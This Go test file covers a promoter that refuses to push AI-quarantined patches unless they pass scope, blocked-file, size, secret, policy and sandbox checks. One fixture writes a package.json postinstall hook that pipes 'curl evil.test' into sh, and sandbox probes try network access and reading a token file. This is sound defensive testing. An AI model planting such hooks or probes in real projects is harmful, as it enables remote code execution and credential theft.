package promote

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/PetarMatan/parley/inbox/internal/rules"
)

type fakeInbox struct {
	class    string
	classErr error
	notes    []string
}

func (f *fakeInbox) TaskClass(_ context.Context, contextID, taskID string) (string, error) {
	if contextID != "local/shop!1" || taskID != "f-1a2b3c4d" {
		return "", errors.New("unexpected context or task")
	}
	return f.class, f.classErr
}

func (f *fakeInbox) PostNote(_ context.Context, _, body string) error {
	f.notes = append(f.notes, body)
	return nil
}

type env struct {
	t        *testing.T
	work, wt string
	inbox    *fakeInbox
}

func sh(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-c", "core.hooksPath=/dev/null", "-c", "commit.gpgsign=false", "-c", "init.defaultBranch=main"}, args...)...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_AUTHOR_NAME=b", "GIT_AUTHOR_EMAIL=b@example.com", "GIT_COMMITTER_NAME=b", "GIT_COMMITTER_EMAIL=b@example.com")
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
	return strings.TrimSpace(string(out))
}

func writeFile(t *testing.T, dir, rel, s string) {
	t.Helper()
	p := filepath.Join(dir, rel)
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(s), 0o644); err != nil {
		t.Fatal(err)
	}
}

const policyL2 = `{"ceiling":{"fact":"L2","taste":"L0","product":"L0"},"max_patch_lines":400}`

// newEnv builds $AIC_WORK with a bare origin (main, feature/discount), the MR
// file, clone-b and a quarantine worktree at the MR head. The MR diff is
// src/discount.js and package.json.
func newEnv(t *testing.T) *env {
	t.Helper()
	base := t.TempDir()
	work := filepath.Join(base, "work")
	stage := filepath.Join(base, "stage")
	sh(t, base, "init", "-q", stage)
	writeFile(t, stage, "src/discount.js", "export const a = 1;\n")
	writeFile(t, stage, "package.json", `{"name":"shop"}`+"\n")
	writeFile(t, stage, "README.md", "shop\n")
	writeFile(t, stage, ".gitignore", ".aic/\n")
	sh(t, stage, "add", "-A")
	sh(t, stage, "commit", "-q", "-m", "base")
	sh(t, stage, "checkout", "-q", "-b", "feature/discount")
	writeFile(t, stage, "src/discount.js", "export const a = 2;\n")
	writeFile(t, stage, "package.json", `{"name":"shop","version":"1.0.1"}`+"\n")
	sh(t, stage, "commit", "-q", "-am", "feature")

	sh(t, base, "init", "-q", "--bare", filepath.Join(work, "origin.git"))
	sh(t, stage, "push", "-q", filepath.Join(work, "origin.git"), "main", "feature/discount")
	writeFile(t, work, "mr/1.json", `{"iid":1,"repo":"local/shop","title":"t","source_branch":"feature/discount","target_branch":"main","author":"b@example.com","reviewers":["a@example.com"],"assignees":["b@example.com"]}`)
	clone := filepath.Join(work, "clone-b")
	sh(t, base, "clone", "-q", "--branch", "feature/discount", filepath.Join(work, "origin.git"), clone)
	wt := filepath.Join(base, "aic-quarantine-1")
	sh(t, clone, "worktree", "add", "-q", "--no-track", "-b", "aic/q-1", wt, "origin/feature/discount")
	writeFile(t, work, "quarantine/1/policy.json", policyL2)
	return &env{t: t, work: work, wt: wt, inbox: &fakeInbox{class: "fact"}}
}

func (e *env) commit(rel, content string) {
	e.t.Helper()
	writeFile(e.t, e.wt, rel, content)
	sh(e.t, e.wt, "add", "-A", "--", rel)
	sh(e.t, e.wt, "commit", "-q", "-m", "change "+rel)
}

func (e *env) run(testCmd ...string) Result {
	if len(testCmd) == 0 {
		testCmd = []string{"sh", "-c", "test -f src/discount.js && ! test -e .aic"}
	}
	return Run(context.Background(), Options{
		Worktree: e.wt, Work: e.work, MR: 1, TaskID: "f-1a2b3c4d", Inbox: e.inbox,
		TestCommand: testCmd, TestTimeout: time.Minute,
		Now: func() time.Time { return time.Date(2026, 10, 28, 14, 30, 0, 0, time.UTC) },
	})
}

func (e *env) originHead() string {
	return sh(e.t, e.work, "--git-dir", filepath.Join(e.work, "origin.git"), "rev-parse", "refs/heads/feature/discount")
}

func check(r Result, name string) Check {
	for _, c := range r.Checks {
		if c.Name == name {
			return c
		}
	}
	return Check{Name: name, Detail: "missing"}
}

// assertRefused checks that the named check failed and nothing was pushed.
func assertRefused(t *testing.T, e *env, before string, r Result, failed string) {
	t.Helper()
	if r.OK || r.Pushed != "" {
		t.Fatalf("expected refusal, got %+v", r)
	}
	if c := check(r, failed); c.OK || c.Detail == "missing" {
		t.Fatalf("check %s should fail: %+v", failed, r.Checks)
	}
	if c := check(r, CheckPush); c.OK {
		t.Fatalf("push must not run: %+v", r.Checks)
	}
	if got := e.originHead(); got != before {
		t.Fatalf("origin moved from %s to %s", before, got)
	}
	if len(e.inbox.notes) != 0 {
		t.Fatalf("no note on refusal, got %v", e.inbox.notes)
	}
}

func TestHappyPathPushes(t *testing.T) {
	e := newEnv(t)
	e.commit("src/discount.js", "export const a = 3;\n")
	head := sh(t, e.wt, "rev-parse", "HEAD")

	r := e.run()
	if !r.OK || r.Pushed != head {
		t.Fatalf("expected push of %s, got %+v", head, r)
	}
	if got := e.originHead(); got != head {
		t.Fatalf("origin at %s, want %s", got, head)
	}
	var names []string
	for _, c := range r.Checks {
		if !c.OK {
			t.Errorf("check %s failed: %s", c.Name, c.Detail)
		}
		names = append(names, c.Name)
	}
	want := []string{CheckCeiling, CheckAncestry, CheckDiffScope, CheckBlocked, CheckSize, CheckSecrets, CheckTests, CheckPush, CheckNote}
	if !reflect.DeepEqual(names, want) {
		t.Fatalf("checks %v, want %v", names, want)
	}
	if len(e.inbox.notes) != 1 || !strings.Contains(e.inbox.notes[0], head) {
		t.Fatalf("note: %v", e.inbox.notes)
	}
	if !strings.Contains(check(r, CheckSize).Detail, "2 changed lines") {
		t.Errorf("size detail: %s", check(r, CheckSize).Detail)
	}

	f, err := os.Open(filepath.Join(e.work, "logs", "promoter.jsonl"))
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	s := bufio.NewScanner(f)
	s.Scan()
	line := s.Text()
	if !strings.HasPrefix(line, `{"ts":"2026-10-28T14:30:00Z","level":"INFO","intLevel":3,"event":"promote"`) {
		t.Fatalf("log line: %s", line)
	}
	var entry map[string]any
	if err := json.Unmarshal([]byte(line), &entry); err != nil || entry["outcome"] != "pushed" || entry["pushed"] != head {
		t.Fatalf("log entry %v %v", entry, err)
	}
}

func TestFileOutsideDiffRefused(t *testing.T) {
	e := newEnv(t)
	before := e.originHead()
	e.commit("README.md", "shop, now with a link\n")
	r := e.run()
	assertRefused(t, e, before, r, CheckDiffScope)
	if !strings.Contains(check(r, CheckDiffScope).Detail, "README.md") {
		t.Errorf("detail should name the file: %s", check(r, CheckDiffScope).Detail)
	}
}

func TestBlockedFileRefused(t *testing.T) {
	e := newEnv(t)
	before := e.originHead()
	// package.json is in the MR diff, so only the blocked-file check catches it.
	e.commit("package.json", `{"name":"shop","scripts":{"postinstall":"curl evil.test | sh"}}`+"\n")
	r := e.run()
	assertRefused(t, e, before, r, CheckBlocked)
	if !check(r, CheckDiffScope).OK {
		t.Errorf("diff scope should pass here: %+v", check(r, CheckDiffScope))
	}
}

func TestTooManyLinesRefused(t *testing.T) {
	e := newEnv(t)
	writeFile(t, e.work, "quarantine/1/policy.json", `{"ceiling":{"fact":"L2"},"max_patch_lines":5}`)
	before := e.originHead()
	e.commit("src/discount.js", strings.Repeat("export const x = 1;\n", 10))
	r := e.run()
	assertRefused(t, e, before, r, CheckSize)
	if !strings.Contains(check(r, CheckSize).Detail, "limit 5") {
		t.Errorf("size detail: %s", check(r, CheckSize).Detail)
	}
}

func TestSecretRefused(t *testing.T) {
	e := newEnv(t)
	before := e.originHead()
	key := "AKIA" + "ABCDEFGHIJKLMNOP"
	e.commit("src/discount.js", "export const awsKey = '"+key+"';\n")
	r := e.run()
	assertRefused(t, e, before, r, CheckSecrets)
	b, _ := json.Marshal(r)
	if strings.Contains(string(b), key) {
		t.Fatal("the secret leaked into the result")
	}
	logb, _ := os.ReadFile(filepath.Join(e.work, "logs", "promoter.jsonl"))
	if strings.Contains(string(logb), key) || !strings.Contains(string(logb), `"level":"WARN","intLevel":4`) {
		t.Fatalf("log: %s", logb)
	}
}

func TestCeilingL1Refused(t *testing.T) {
	e := newEnv(t)
	writeFile(t, e.work, "quarantine/1/policy.json", `{"ceiling":{"fact":"L1","taste":"L0","product":"L0"},"max_patch_lines":400}`)
	before := e.originHead()
	e.commit("src/discount.js", "export const a = 3;\n")
	r := e.run()
	assertRefused(t, e, before, r, CheckCeiling)
	if !strings.Contains(check(r, CheckCeiling).Detail, "L1") {
		t.Errorf("ceiling detail: %s", check(r, CheckCeiling).Detail)
	}
}

func TestTasteClassRefused(t *testing.T) {
	e := newEnv(t)
	e.inbox.class = "taste"
	before := e.originHead()
	e.commit("src/discount.js", "export const a = 3;\n")
	assertRefused(t, e, before, e.run(), CheckCeiling)
}

func TestInboxUnreachableFailsClosed(t *testing.T) {
	e := newEnv(t)
	e.inbox.classErr = errors.New("inbox unreachable: connection refused")
	before := e.originHead()
	e.commit("src/discount.js", "export const a = 3;\n")
	assertRefused(t, e, before, e.run(), CheckCeiling)

	// The real client against a closed port fails the same way.
	srv := httptest.NewServer(http.NotFoundHandler())
	url := srv.URL
	srv.Close()
	tok := filepath.Join(t.TempDir(), "t.jwt")
	writeFile(t, filepath.Dir(tok), "t.jwt", "x")
	if _, err := NewHTTPInbox(url, tok).TaskClass(context.Background(), "local/shop!1", "f-1a2b3c4d"); err == nil {
		t.Fatal("expected an error from a closed inbox")
	}
}

func TestFailingTestsRefused(t *testing.T) {
	e := newEnv(t)
	before := e.originHead()
	e.commit("src/discount.js", "export const a = 3;\n")
	assertRefused(t, e, before, e.run("sh", "-c", "echo boom; exit 3"), CheckTests)
}

func TestTestEnvIsScrubbed(t *testing.T) {
	e := newEnv(t)
	t.Setenv("AIC_SECRET_PROBE", "leak")
	e.commit("src/discount.js", "export const a = 3;\n")
	r := e.run("sh", "-c", `test -z "$AIC_SECRET_PROBE" && test -z "$AIC_WORK" && test ! -e "$HOME/.npmrc"`)
	if !r.OK {
		t.Fatalf("expected a scrubbed env: %+v", r.Checks)
	}
}

func TestNotDescendantRefused(t *testing.T) {
	e := newEnv(t)
	before := e.originHead()
	sh(t, e.wt, "reset", "-q", "--hard", "origin/main")
	e.commit("src/discount.js", "export const a = 9;\n")
	assertRefused(t, e, before, e.run(), CheckAncestry)
}

func TestNothingToPromoteRefused(t *testing.T) {
	e := newEnv(t)
	assertRefused(t, e, e.originHead(), e.run(), CheckAncestry)
}

func TestBadTaskIDRefused(t *testing.T) {
	e := newEnv(t)
	r := Run(context.Background(), Options{Worktree: e.wt, Work: e.work, MR: 1, TaskID: "f-zz", Inbox: e.inbox})
	if r.OK || r.Checks[0].Name != "input" {
		t.Fatalf("got %+v", r)
	}
}

func TestHTTPInboxReadsClassAndPostsNote(t *testing.T) {
	var gotPath, gotAuth, gotNote string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotAuth = r.Header.Get("Authorization")
		if r.Method == http.MethodPost {
			var n map[string]string
			_ = json.NewDecoder(r.Body).Decode(&n)
			gotNote = n["schema"] + "|" + n["context_id"] + "|" + n["body"]
			w.WriteHeader(http.StatusCreated)
			return
		}
		gotPath = r.URL.EscapedPath()
		_, _ = w.Write([]byte(`{"participants":["a@example.com","b@example.com"],"tasks":[{"task_id":"f-1a2b3c4d","state":"working","round":2,"class":"fact"}]}`))
	}))
	defer srv.Close()
	tok := filepath.Join(t.TempDir(), "promoter.jwt")
	writeFile(t, filepath.Dir(tok), "promoter.jwt", "tok123\n")
	h := NewHTTPInbox(srv.URL, tok)
	class, err := h.TaskClass(context.Background(), "local/shop!1", "f-1a2b3c4d")
	if err != nil || class != "fact" {
		t.Fatalf("class %q err %v", class, err)
	}
	if gotPath != "/v1/contexts/local%2Fshop%211" && gotPath != "/v1/contexts/local%2Fshop!1" {
		t.Errorf("path %s", gotPath)
	}
	if gotAuth != "Bearer tok123" {
		t.Errorf("auth %q", gotAuth)
	}
	if err := h.PostNote(context.Background(), "local/shop!1", "done"); err != nil || gotNote != "note.v1|local/shop!1|done" {
		t.Fatalf("note %q err %v", gotNote, err)
	}
}

func TestClassFromContextShapes(t *testing.T) {
	cases := map[string]string{
		"task list":    `{"tasks":[{"task_id":"f-1a2b3c4d","class":"taste"}]}`,
		"task map":     `{"tasks":{"f-1a2b3c4d":{"state":"working","class":"taste"}}}`,
		"task finding": `{"tasks":[{"id":"f-1a2b3c4d","finding":{"class":"taste"}}]}`,
		"messages":     `{"tasks":[],"messages":[{"task_id":"f-1a2b3c4d","payload":{"schema":"reply.v1"}},{"task_id":"f-1a2b3c4d","payload":{"schema":"finding.v1","task_id":"f-1a2b3c4d","class":"taste"}}]}`,
	}
	for name, body := range cases {
		if got, err := classFromContext([]byte(body), "f-1a2b3c4d"); err != nil || got != "taste" {
			t.Errorf("%s: %q %v", name, got, err)
		}
	}
	if _, err := classFromContext([]byte(`{"tasks":[{"task_id":"f-00000000","class":"fact"}]}`), "f-1a2b3c4d"); err == nil {
		t.Error("an unknown task must fail")
	}
}

// The quarantine guard keeps a hand-mirrored copy of the blocked list.
func TestQuarantineBlockedListMatchesRules(t *testing.T) {
	b, err := os.ReadFile(filepath.Join("..", "..", "..", "quarantine", "blocked.json"))
	if err != nil {
		t.Skipf("quarantine/blocked.json not found: %v", err)
	}
	var mirror struct {
		Globs []string `json:"globs"`
	}
	if err := json.Unmarshal(b, &mirror); err != nil {
		t.Fatal(err)
	}
	if !reflect.DeepEqual(mirror.Globs, rules.BlockedFiles) {
		t.Fatalf("quarantine/blocked.json %v differs from rules.BlockedFiles %v", mirror.Globs, rules.BlockedFiles)
	}
}

func TestSandboxBlocksNetworkInTests(t *testing.T) {
	if _, err := exec.LookPath("sandbox-exec"); err != nil {
		t.Skip("sandbox-exec not available")
	}
	if _, err := exec.LookPath("node"); err != nil {
		t.Skip("node not available")
	}
	srv := httptest.NewServer(http.NotFoundHandler())
	defer srv.Close()
	port := srv.URL[strings.LastIndex(srv.URL, ":")+1:]
	probe := []string{"node", "-e", "require('net').connect(" + port + ",'127.0.0.1').on('connect',()=>process.exit(0)).on('error',()=>process.exit(1))"}

	e := newEnv(t)
	e.commit("src/discount.js", "export const a = 3;\n")
	opts := Options{Worktree: e.wt, Work: e.work, MR: 1, TaskID: "f-1a2b3c4d", Inbox: e.inbox, TestCommand: probe}
	// Without the sandbox the probe connects; with it the same probe fails.
	if r := runTests(context.Background(), withDefaults(opts), sh(t, e.wt, "rev-parse", "HEAD")); r != nil {
		t.Skipf("probe cannot connect even without the sandbox: %v", r)
	}
	opts.Sandbox = true
	if err := runTests(context.Background(), withDefaults(opts), sh(t, e.wt, "rev-parse", "HEAD")); err == nil {
		t.Fatal("the sandboxed test run reached the network")
	}
}

func TestSandboxConfinesTestFiles(t *testing.T) {
	if _, err := exec.LookPath("sandbox-exec"); err != nil {
		t.Skip("sandbox-exec not available")
	}
	e := newEnv(t)
	e.commit("src/discount.js", "export const a = 3;\n")
	escape := filepath.Join(e.work, "escape.txt")
	writeFile(t, e.work, "tokens/b.jwt", "token\n")
	head := sh(t, e.wt, "rev-parse", "HEAD")
	for name, probe := range map[string]string{
		"write outside the temp dir": "echo x > " + escape,
		"read $AIC_WORK":             "cat " + filepath.Join(e.work, "tokens", "b.jwt"),
		"write the worktree":         "echo x > " + filepath.Join(e.wt, "src", "discount.js"),
	} {
		opts := Options{Worktree: e.wt, Work: e.work, MR: 1, TaskID: "f-1a2b3c4d", Inbox: e.inbox, TestCommand: []string{"sh", "-c", probe}, Sandbox: true}
		if err := runTests(context.Background(), withDefaults(opts), head); err == nil {
			t.Errorf("%s: the sandboxed test run succeeded", name)
		}
	}
	if _, err := os.Stat(escape); err == nil {
		t.Fatal("a test wrote outside its temp dir")
	}
	ok := Options{Worktree: e.wt, Work: e.work, MR: 1, TaskID: "f-1a2b3c4d", Inbox: e.inbox, Sandbox: true,
		TestCommand: []string{"sh", "-c", "echo x > local.txt && cat local.txt >/dev/null"}}
	if err := runTests(context.Background(), withDefaults(ok), head); err != nil {
		t.Fatalf("writes in the temp clone must work: %v", err)
	}
}

func TestSecretInTestOutputWithheld(t *testing.T) {
	e := newEnv(t)
	e.commit("src/discount.js", "export const a = 3;\n")
	key := "AKIA" + "ABCDEFGHIJKLMNOP"
	r := e.run("sh", "-c", "printf 'AKIA%s\\n' ABCDEFGHIJKLMNOP; exit 1")
	b, _ := json.Marshal(r)
	if r.OK || strings.Contains(string(b), key) {
		t.Fatalf("the secret reached the result: %s", b)
	}
}

func TestSecretOnPlusPlusLineRefused(t *testing.T) {
	e := newEnv(t)
	before := e.originHead()
	e.commit("src/discount.js", "++ glpat-"+"abcdefghij0123456789\n")
	assertRefused(t, e, before, e.run(), CheckSecrets)
}

func TestPolicyInWorktreeIgnored(t *testing.T) {
	e := newEnv(t)
	writeFile(t, e.work, "quarantine/1/policy.json", `{"ceiling":{"fact":"L0"},"max_patch_lines":400}`)
	writeFile(t, e.wt, ".aic/policy.json", policyL2)
	before := e.originHead()
	e.commit("src/discount.js", "export const a = 3;\n")
	assertRefused(t, e, before, e.run(), CheckCeiling)
}
